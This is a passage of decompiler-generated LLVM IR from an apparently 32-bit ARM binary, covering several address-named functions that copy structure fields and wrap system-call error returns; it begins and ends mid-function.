  %v2_13ce0 = load i32, i32* %arg1, align 4
  %v3_13ce0 = add i32 %tmp, 4
  %v4_13ce0 = inttoptr i32 %v3_13ce0 to i32*
  %v5_13ce0 = load i32, i32* %v4_13ce0, align 4
  store i32 %v5_13ce0, i32* %r4.global-to-local, align 4
  %v0_13ce4 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ce4 = inttoptr i32 %v0_13ce4 to i32*
  store i32 %v2_13ce0, i32* %v1_13ce4, align 4
  %v3_13ce4 = add i32 %v0_13ce4, 4
  %v4_13ce4 = inttoptr i32 %v3_13ce4 to i32*
  %v5_13ce4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13ce4, i32* %v4_13ce4, align 4
  %v0_13ce8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ce8 = add i32 %v0_13ce8, 32
  %v1_13cec = inttoptr i32 %v1_13ce8 to i32*
  %v2_13cec = load i32, i32* %v1_13cec, align 4
  %v3_13cec = add i32 %v0_13ce8, 36
  %v4_13cec = inttoptr i32 %v3_13cec to i32*
  %v5_13cec = load i32, i32* %v4_13cec, align 4
  store i32 %v5_13cec, i32* %r4.global-to-local, align 4
  %v1_13cf0 = add i32 %v0_13ce8, 96
  %v2_13cf0 = inttoptr i32 %v1_13cf0 to i32*
  %v3_13cf0 = load i32, i32* %v2_13cf0, align 4
  store i32 %v3_13cf0, i32* %r2.global-to-local, align 4
  %v1_13cf4 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cf4 = add i32 %v1_13cf4, 32
  %v3_13cf4 = inttoptr i32 %v2_13cf4 to i32*
  store i32 %v2_13cec, i32* %v3_13cf4, align 4
  %v0_13cf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13cf8 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cf8 = add i32 %v1_13cf8, 36
  %v3_13cf8 = inttoptr i32 %v2_13cf8 to i32*
  store i32 %v0_13cf8, i32* %v3_13cf8, align 4
  %v0_13cfc = load i32, i32* %r2.global-to-local, align 4
  %v1_13cfc = load i32, i32* %r6.global-to-local, align 4
  %v2_13cfc = add i32 %v1_13cfc, 12
  %v3_13cfc = inttoptr i32 %v2_13cfc to i32*
  store i32 %v0_13cfc, i32* %v3_13cfc, align 4
  %v0_13d00 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d00 = add i32 %v0_13d00, 48
  %v2_13d00 = inttoptr i32 %v1_13d00 to i32*
  %v3_13d00 = load i32, i32* %v2_13d00, align 4
  %v1_13d04 = add i32 %v0_13d00, 24
  store i32 %v1_13d04, i32* %ip.global-to-local, align 4
  %v1_13d08 = inttoptr i32 %v1_13d04 to i32*
  %v2_13d08 = load i32, i32* %v1_13d08, align 4
  store i32 %v2_13d08, i32* %ip.global-to-local, align 4
  %v3_13d08 = add i32 %v0_13d00, 28
  %v4_13d08 = inttoptr i32 %v3_13d08 to i32*
  %v5_13d08 = load i32, i32* %v4_13d08, align 4
  store i32 %v5_13d08, i32* %lr.global-to-local, align 4
  %v1_13d0c = load i32, i32* %r6.global-to-local, align 4
  %v2_13d0c = add i32 %v1_13d0c, 44
  %v3_13d0c = inttoptr i32 %v2_13d0c to i32*
  store i32 %v3_13d00, i32* %v3_13d0c, align 4
  %v0_13d10 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d10 = add i32 %v0_13d10, 64
  %v2_13d10 = inttoptr i32 %v1_13d10 to i32*
  %v3_13d10 = load i32, i32* %v2_13d10, align 4
  %v1_13d14 = add i32 %v0_13d10, 56
  %v2_13d14 = inttoptr i32 %v1_13d14 to i32*
  %v3_13d14 = load i32, i32* %v2_13d14, align 4
  store i32 %v3_13d14, i32* %r2.global-to-local, align 4
  %v1_13d18 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d18 = add i32 %v1_13d18, 52
  %v3_13d18 = inttoptr i32 %v2_13d18 to i32*
  store i32 %v3_13d10, i32* %v3_13d18, align 4
  %v0_13d1c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d1c = load i32, i32* %r6.global-to-local, align 4
  %v2_13d1c = add i32 %v1_13d1c, 48
  %v3_13d1c = inttoptr i32 %v2_13d1c to i32*
  store i32 %v0_13d1c, i32* %v3_13d1c, align 4
  %v0_13d20 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d20 = add i32 %v0_13d20, 72
  %v1_13d24 = inttoptr i32 %v1_13d20 to i32*
  %v2_13d24 = load i32, i32* %v1_13d24, align 4
  %v3_13d24 = add i32 %v0_13d20, 76
  %v4_13d24 = inttoptr i32 %v3_13d24 to i32*
  %v5_13d24 = load i32, i32* %v4_13d24, align 4
  store i32 %v5_13d24, i32* %r1.global-to-local, align 4
  %v0_13d28 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d28 = add i32 %v0_13d28, 56
  %v1_13d2c = inttoptr i32 %v1_13d28 to i32*
  store i32 %v2_13d24, i32* %v1_13d2c, align 4
  %v3_13d2c = add i32 %v0_13d28, 60
  %v4_13d2c = inttoptr i32 %v3_13d2c to i32*
  %v5_13d2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13d2c, i32* %v4_13d2c, align 4
  %v0_13d30 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d30 = add i32 %v0_13d30, 80
  %v1_13d34 = inttoptr i32 %v1_13d30 to i32*
  %v2_13d34 = load i32, i32* %v1_13d34, align 4
  %v3_13d34 = add i32 %v0_13d30, 84
  %v4_13d34 = inttoptr i32 %v3_13d34 to i32*
  %v5_13d34 = load i32, i32* %v4_13d34, align 4
  store i32 %v5_13d34, i32* %r1.global-to-local, align 4
  %v0_13d38 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d38 = add i32 %v0_13d38, 64
  %v1_13d3c = inttoptr i32 %v1_13d38 to i32*
  store i32 %v2_13d34, i32* %v1_13d3c, align 4
  %v3_13d3c = add i32 %v0_13d38, 68
  %v4_13d3c = inttoptr i32 %v3_13d3c to i32*
  %v5_13d3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13d3c, i32* %v4_13d3c, align 4
  %v0_13d40 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d40 = add i32 %v0_13d40, 16
  %v2_13d40 = inttoptr i32 %v1_13d40 to i32*
  %v3_13d40 = load i32, i32* %v2_13d40, align 4
  %v1_13d44 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d44 = add i32 %v1_13d44, 16
  %v3_13d44 = inttoptr i32 %v2_13d44 to i32*
  store i32 %v3_13d40, i32* %v3_13d44, align 4
  %v0_13d48 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d48 = add i32 %v0_13d48, 88
  %v1_13d4c = add i32 %v0_13d48, 20
  %v2_13d4c = inttoptr i32 %v1_13d4c to i32*
  %v3_13d4c = load i32, i32* %v2_13d4c, align 4
  store i32 %v3_13d4c, i32* %r2.global-to-local, align 4
  %v1_13d50 = inttoptr i32 %v1_13d48 to i32*
  %v2_13d50 = load i32, i32* %v1_13d50, align 4
  %v3_13d50 = add i32 %v0_13d48, 92
  %v4_13d50 = inttoptr i32 %v3_13d50 to i32*
  %v5_13d50 = load i32, i32* %v4_13d50, align 4
  store i32 %v5_13d50, i32* %r1.global-to-local, align 4
  %v0_13d54 = load i32, i32* %r6.global-to-local, align 4
  %v1_13d54 = add i32 %v0_13d54, 72
  %v1_13d58 = inttoptr i32 %v1_13d54 to i32*
  store i32 %v2_13d50, i32* %v1_13d58, align 4
  %v3_13d58 = add i32 %v0_13d54, 76
  %v4_13d58 = inttoptr i32 %v3_13d58 to i32*
  %v5_13d58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13d58, i32* %v4_13d58, align 4
  %v0_13d5c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d5c = load i32, i32* %r6.global-to-local, align 4
  %v2_13d5c = add i32 %v1_13d5c, 20
  %v3_13d5c = inttoptr i32 %v2_13d5c to i32*
  store i32 %v0_13d5c, i32* %v3_13d5c, align 4
  %v0_13d60 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d60 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d60 = add i32 %v1_13d60, 24
  %v3_13d60 = inttoptr i32 %v2_13d60 to i32*
  store i32 %v0_13d60, i32* %v3_13d60, align 4
  %v0_13d64 = load i32, i32* %lr.global-to-local, align 4
  %v1_13d64 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d64 = add i32 %v1_13d64, 28
  %v3_13d64 = inttoptr i32 %v2_13d64 to i32*
  store i32 %v0_13d64, i32* %v3_13d64, align 4
  %v2_13d68 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13d68, i32* %r4.global-to-local, align 4
  ret i32 %v2_13d50

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_13d70(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13d70:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13d8c = inttoptr i32 %arg2 to i8*
  %v3_13d8c = call i32 @function_11060(i8* %v2_13d8c, i32 0)
  %v1_13d90 = add i32 %tmp, 4
  %v2_13d90 = inttoptr i32 %v1_13d90 to i32*
  %v3_13d90 = load i32, i32* %v2_13d90, align 4
  %v2_13d94 = load i32, i32* %arg1, align 4
  store i32 %v2_13d94, i32* %r8.global-to-local, align 4
  %v1_13d98 = load i32, i32* %r5.global-to-local, align 4
  %v2_13d98 = add i32 %v1_13d98, 12
  %v3_13d98 = inttoptr i32 %v2_13d98 to i32*
  store i32 %v3_13d90, i32* %v3_13d98, align 4
  %v0_13d9c = load i32, i32* %r4.global-to-local, align 4
  %v1_13d9c = add i32 %v0_13d9c, 20
  %v2_13d9c = inttoptr i32 %v1_13d9c to i32*
  %v3_13d9c = load i32, i32* %v2_13d9c, align 4
  %v1_13da0 = add i32 %v0_13d9c, 16
  %v2_13da0 = inttoptr i32 %v1_13da0 to i32*
  %v3_13da0 = load i32, i32* %v2_13da0, align 4
  store i32 %v3_13da0, i32* %r6.global-to-local, align 4
  %v1_13da4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13da4 = add i32 %v1_13da4, 44
  %v3_13da4 = inttoptr i32 %v2_13da4 to i32*
  store i32 %v3_13d9c, i32* %v3_13da4, align 4
  %v0_13da8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13da8 = add i32 %v0_13da8, 24
  %v2_13da8 = inttoptr i32 %v1_13da8 to i32*
  %v3_13da8 = load i32, i32* %v2_13da8, align 4
  %v1_13dac = load i32, i32* %r5.global-to-local, align 4
  %v2_13dac = add i32 %v1_13dac, 48
  %v3_13dac = inttoptr i32 %v2_13dac to i32*
  store i32 %v3_13da8, i32* %v3_13dac, align 4
  %v0_13db0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13db0 = add i32 %v0_13db0, 28
  %v2_13db0 = inttoptr i32 %v1_13db0 to i32*
  %v3_13db0 = load i32, i32* %v2_13db0, align 4
  %v1_13db4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13db4 = add i32 %v1_13db4, 52
  %v3_13db4 = inttoptr i32 %v2_13db4 to i32*
  store i32 %v3_13db0, i32* %v3_13db4, align 4
  %v0_13db8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13db8 = add i32 %v0_13db8, 32
  %v1_13dbc = inttoptr i32 %v1_13db8 to i32*
  %v2_13dbc = load i32, i32* %v1_13dbc, align 4
  %v3_13dbc = add i32 %v0_13db8, 36
  %v4_13dbc = inttoptr i32 %v3_13dbc to i32*
  %v5_13dbc = load i32, i32* %v4_13dbc, align 4
  store i32 %v5_13dbc, i32* %r1.global-to-local, align 4
  %v0_13dc0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13dc0 = add i32 %v0_13dc0, 56
  %v1_13dc4 = inttoptr i32 %v1_13dc0 to i32*
  store i32 %v2_13dbc, i32* %v1_13dc4, align 4
  %v3_13dc4 = add i32 %v0_13dc0, 60
  %v4_13dc4 = inttoptr i32 %v3_13dc4 to i32*
  %v5_13dc4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13dc4, i32* %v4_13dc4, align 4
  %v0_13dc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13dc8 = add i32 %v0_13dc8, 40
  %v1_13dcc = inttoptr i32 %v1_13dc8 to i32*
  %v2_13dcc = load i32, i32* %v1_13dcc, align 4
  %v3_13dcc = add i32 %v0_13dc8, 44
  %v4_13dcc = inttoptr i32 %v3_13dcc to i32*
  %v5_13dcc = load i32, i32* %v4_13dcc, align 4
  store i32 %v5_13dcc, i32* %r1.global-to-local, align 4
  %v0_13dd0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13dd0 = add i32 %v0_13dd0, 64
  %v1_13dd4 = inttoptr i32 %v1_13dd0 to i32*
  store i32 %v2_13dcc, i32* %v1_13dd4, align 4
  %v3_13dd4 = add i32 %v0_13dd0, 68
  %v4_13dd4 = inttoptr i32 %v3_13dd4 to i32*
  %v5_13dd4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13dd4, i32* %v4_13dd4, align 4
  %v0_13dd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13dd8 = add i32 %v0_13dd8, 48
  %v1_13ddc = inttoptr i32 %v1_13dd8 to i32*
  %v2_13ddc = load i32, i32* %v1_13ddc, align 4
  %v3_13ddc = add i32 %v0_13dd8, 52
  %v4_13ddc = inttoptr i32 %v3_13ddc to i32*
  %v5_13ddc = load i32, i32* %v4_13ddc, align 4
  store i32 %v5_13ddc, i32* %r1.global-to-local, align 4
  %v1_13de0 = add i32 %v0_13dd8, 8
  %v2_13de0 = inttoptr i32 %v1_13de0 to i16*
  %v3_13de0 = load i16, i16* %v2_13de0, align 2
  %v4_13de0 = zext i16 %v3_13de0 to i32
  store i32 %v4_13de0, i32* %r2.global-to-local, align 4
  %v1_13de4 = add i32 %v0_13dd8, 10
  %v2_13de4 = inttoptr i32 %v1_13de4 to i16*
  %v3_13de4 = load i16, i16* %v2_13de4, align 2
  %v4_13de4 = zext i16 %v3_13de4 to i32
  store i32 %v4_13de4, i32* %ip.global-to-local, align 4
  %v1_13de8 = add i32 %v0_13dd8, 12
  %v2_13de8 = inttoptr i32 %v1_13de8 to i16*
  %v3_13de8 = load i16, i16* %v2_13de8, align 2
  %v4_13de8 = zext i16 %v3_13de8 to i32
  store i32 %v4_13de8, i32* %lr.global-to-local, align 4
  %v1_13dec = add i32 %v0_13dd8, 14
  %v2_13dec = inttoptr i32 %v1_13dec to i16*
  %v3_13dec = load i16, i16* %v2_13dec, align 2
  %v4_13dec = zext i16 %v3_13dec to i32
  store i32 %v4_13dec, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_13df8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13df8 = add i32 %v0_13df8, 72
  %v1_13dfc = inttoptr i32 %v1_13df8 to i32*
  store i32 %v2_13ddc, i32* %v1_13dfc, align 4
  %v3_13dfc = add i32 %v0_13df8, 76
  %v4_13dfc = inttoptr i32 %v3_13dfc to i32*
  %v5_13dfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13dfc, i32* %v4_13dfc, align 4
  %v0_13e00 = load i32, i32* %r5.global-to-local, align 4
  %v1_13e00 = inttoptr i32 %v0_13e00 to i32*
  %v2_13e00 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_13e00, i32* %v1_13e00, align 4
  %v3_13e00 = add i32 %v0_13e00, 4
  %v4_13e00 = inttoptr i32 %v3_13e00 to i32*
  %v5_13e00 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_13e00, i32* %v4_13e00, align 4
  %v0_13e04 = load i32, i32* %r6.global-to-local, align 4
  %v1_13e04 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e04 = add i32 %v1_13e04, 32
  %v3_13e04 = inttoptr i32 %v2_13e04 to i32*
  store i32 %v0_13e04, i32* %v3_13e04, align 4
  %v0_13e08 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e08 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e08 = add i32 %v1_13e08, 36
  %v3_13e08 = inttoptr i32 %v2_13e08 to i32*
  store i32 %v0_13e08, i32* %v3_13e08, align 4
  %v0_13e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_13e0c = load i32, i32* %r5.global-to-local, align 4
  %v2_13e0c = add i32 %v1_13e0c, 16
  %v3_13e0c = inttoptr i32 %v2_13e0c to i32*
  store i32 %v0_13e0c, i32* %v3_13e0c, align 4
  %v0_13e10 = load i32, i32* %ip.global-to-local, align 4
  %v1_13e10 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e10 = add i32 %v1_13e10, 20
  %v3_13e10 = inttoptr i32 %v2_13e10 to i32*
  store i32 %v0_13e10, i32* %v3_13e10, align 4
  %v0_13e14 = load i32, i32* %lr.global-to-local, align 4
  %v1_13e14 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e14 = add i32 %v1_13e14, 24
  %v3_13e14 = inttoptr i32 %v2_13e14 to i32*
  store i32 %v0_13e14, i32* %v3_13e14, align 4
  %v0_13e18 = load i32, i32* %r4.global-to-local, align 4
  %v1_13e18 = load i32, i32* %r5.global-to-local, align 4
  %v2_13e18 = add i32 %v1_13e18, 28
  %v3_13e18 = inttoptr i32 %v2_13e18 to i32*
  store i32 %v0_13e18, i32* %v3_13e18, align 4
  ret i32 %v2_13ddc

; uselistorder directives
  uselistorder i32 %v0_13dd8, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 68, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 60, { 3, 4, 1, 5, 6, 0, 2, 7 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @function_13e28() local_unnamed_addr {
dec_label_pc_13e28:
  %stack_var_-16 = alloca i32, align 4
  %v2_13e2c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13e38 = call i32 @function_15b68(i32 7, i32 %v2_13e2c)
  %v1_13e3c = icmp slt i32 %v2_13e38, 0
  %v5_13e40 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_13e3c, i32 256, i32 %v5_13e40
  ret i32 %storemerge
}

define i32 @function_13e54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13e54:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e54 = load i32, i32* @r7, align 4
  store i32 %v3_13e54, i32* %stack_var_-8, align 4
  %v0_13e60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13e60, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13e60, -4095
  br i1 %tmp, label %dec_label_pc_13e80, label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e54
  %v0_13e70 = call i32 @function_11008()
  %v0_13e74 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e74 = sub i32 0, %v0_13e74
  %v2_13e78 = inttoptr i32 %v0_13e70 to i32*
  store i32 %v1_13e74, i32* %v2_13e78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13e80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13e80

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e54, %dec_label_pc_13e70
  %v1_13e84 = phi i32 [ %v0_13e60, %dec_label_pc_13e54 ], [ -1, %dec_label_pc_13e70 ]
  %v2_13e80 = phi i32 [ %v3_13e54, %dec_label_pc_13e54 ], [ %v2_13e80.pre, %dec_label_pc_13e70 ]
  store i32 %v2_13e80, i32* @r7, align 4
  ret i32 %v1_13e84

; uselistorder directives
  uselistorder i32 %v0_13e60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e80, { 1, 0 }
}

define i32 @function_13e88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e88:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e88 = load i32, i32* @r7, align 4
  store i32 %v3_13e88, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13eb0, label %dec_label_pc_13ea0

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e88
  %v0_13ea0 = call i32 @function_11008()
  %v0_13ea4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ea4 = sub i32 0, %v0_13ea4
  %v2_13ea8 = inttoptr i32 %v0_13ea0 to i32*
  store i32 %v1_13ea4, i32* %v2_13ea8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13eb4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13eb0

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13e88, %dec_label_pc_13ea0
  %v2_13eb4 = phi i32 [ %v3_13e88, %dec_label_pc_13e88 ], [ %v2_13eb4.pre, %dec_label_pc_13ea0 ]
  %v0_13eb0 = phi i32 [ %arg1, %dec_label_pc_13e88 ], [ -1, %dec_label_pc_13ea0 ]
  store i32 %v2_13eb4, i32* @r7, align 4
  ret i32 %v0_13eb0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13eb0, { 1, 0 }
}

define i32 @function_13ebc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13ebc:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13ef0, label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13ebc
  %v0_13ee0 = call i32 @function_11008()
  %v0_13ee4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ee4 = sub i32 0, %v0_13ee4
  %v2_13ee8 = inttoptr i32 %v0_13ee0 to i32*
  store i32 %v1_13ee4, i32* %v2_13ee8, align 4
  br label %dec_label_pc_13ef0

dec_label_pc_13ef0:                               ; preds = %dec_label_pc_13ebc, %dec_label_pc_13ee0
  %v1_13ef8 = phi i32 [ %arg1, %dec_label_pc_13ebc ], [ -1, %dec_label_pc_13ee0 ]
  ret i32 %v1_13ef8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ef0, { 1, 0 }
}

define i32 @function_13efc(i32 %arg1) local_unnamed_addr {
dec_label_pc_13efc:
  %v1_13f0c = load i32, i32* @r0, align 4
  ret i32 %v1_13f0c
}

define i32 @function_13f10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13f10:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f10 = load i32, i32* @r7, align 4
  store i32 %v3_13f10, i32* %stack_var_-8, align 4
  %v0_13f1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13f1c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13f1c, -4095
  br i1 %tmp, label %dec_label_pc_13f3c, label %dec_label_pc_13f2c

dec_label_pc_13f2c:                               ; preds = %dec_label_pc_13f10
  %v0_13f2c = call i32 @function_11008()
  %v0_13f30 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f30 = sub i32 0, %v0_13f30
  %v2_13f34 = inttoptr i32 %v0_13f2c to i32*
  store i32 %v1_13f30, i32* %v2_13f34, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13f3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f10, %dec_label_pc_13f2c
  %v1_13f40 = phi i32 [ %v0_13f1c, %dec_label_pc_13f10 ], [ -1, %dec_label_pc_13f2c ]
  %v2_13f3c = phi i32 [ %v3_13f10, %dec_label_pc_13f10 ], [ %v2_13f3c.pre, %dec_label_pc_13f2c ]
  store i32 %v2_13f3c, i32* @r7, align 4
  ret i32 %v1_13f40

; uselistorder directives
  uselistorder i32 %v0_13f1c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13f3c, { 1, 0 }
}

define i32 @function_13f44(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f44:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f48.outer

dec_label_pc_13f48.outer:                         ; preds = %dec_label_pc_13f60, %dec_label_pc_13f44
  %v0_13f48.ph = phi i32 [ %v0_13f48.pre.pre, %dec_label_pc_13f60 ], [ %arg1, %dec_label_pc_13f44 ]
  %tmp = icmp ult i32 %v0_13f48.ph, -4095
  br label %dec_label_pc_13f48

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f48.outer, %dec_label_pc_13f48
  br i1 %tmp, label %dec_label_pc_13f48, label %dec_label_pc_13f60

dec_label_pc_13f60:                               ; preds = %dec_label_pc_13f48
  %v0_13f60 = call i32 @function_11008()
  %v1_13f64 = sub i32 0, %v0_13f48.ph
  %v2_13f68 = inttoptr i32 %v0_13f60 to i32*
  store i32 %v1_13f64, i32* %v2_13f68, align 4
  %v0_13f48.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f48.outer

; uselistorder directives
  uselistorder i32 %v0_13f48.ph, { 1, 0 }
  uselistorder label %dec_label_pc_13f48, { 1, 0 }
}

define i32 @function_13f70(i32* %arg1) local_unnamed_addr {
dec_label_pc_13f70:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 124088, i32* @r6, align 4
  %v1_13f84 = add i32 %tmp, 24
  store i32 %v1_13f84, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_13f9c = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  store i32 %v4_13f9c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13f9c)
  %v0_13fb0 = load i32, i32* @r6, align 4
  %v2_13fb0 = add i32 %v0_13fb0, 16
  %v3_13fb0 = inttoptr i32 %v2_13fb0 to i32*
  %v4_13fb0 = load i32, i32* %v3_13fb0, align 4
  store i32 %v4_13fb0, i32* %ip.global-to-local, align 4
  store i32 81852, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13fb0)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %dec_label_pc_13ff0, %dec_label_pc_13f70
  %v0_13fc0 = load i32, i32* @r5, align 4
  %v1_13fc0 = add i32 %v0_13fc0, 4
  %v2_13fc0 = inttoptr i32 %v1_13fc0 to i32*
  %v3_13fc0 = load i32, i32* %v2_13fc0, align 4
  %v4_13fc0 = add i32 %v0_13fc0, 8
  %v5_13fc0 = inttoptr i32 %v4_13fc0 to i32*
  %v6_13fc0 = load i32, i32* %v5_13fc0, align 4
  %tmp10 = icmp ugt i32 %v6_13fc0, %v3_13fc0
  br i1 %tmp10, label %dec_label_pc_13ff0, label %dec_label_pc_13fcc

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13fc0
  %v1_13fcc = inttoptr i32 %v0_13fc0 to i32*
  %v2_13fcc = load i32, i32* %v1_13fcc, align 4
  %v1_13fd0 = add i32 %v0_13fc0, 12
  %v2_13fd0 = inttoptr i32 %v1_13fd0 to i32*
  %v3_13fd0 = load i32, i32* %v2_13fd0, align 4
  %v1_13fd4 = add i32 %v0_13fc0, 20
  %v2_13fd4 = inttoptr i32 %v1_13fd4 to i32*
  %v3_13fd4 = load i32, i32* %v2_13fd4, align 4
  %v4_13fd8 = inttoptr i32 %v3_13fd0 to i32*
  %v5_13fd8 = call i32 @function_15b9c(i32 %v2_13fcc, i32* %v4_13fd8, i32 %v3_13fd4, i32 %v6_13fc0)
  %tmp9 = icmp slt i32 %v5_13fd8, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13fe8

.thread:                                          ; preds = %dec_label_pc_13fcc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14020

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fcc
  %v1_13fe8 = load i32, i32* @r5, align 4
  %v2_13fe8 = add i32 %v1_13fe8, 8
  %v3_13fe8 = inttoptr i32 %v2_13fe8 to i32*
  store i32 %v5_13fd8, i32* %v3_13fe8, align 4
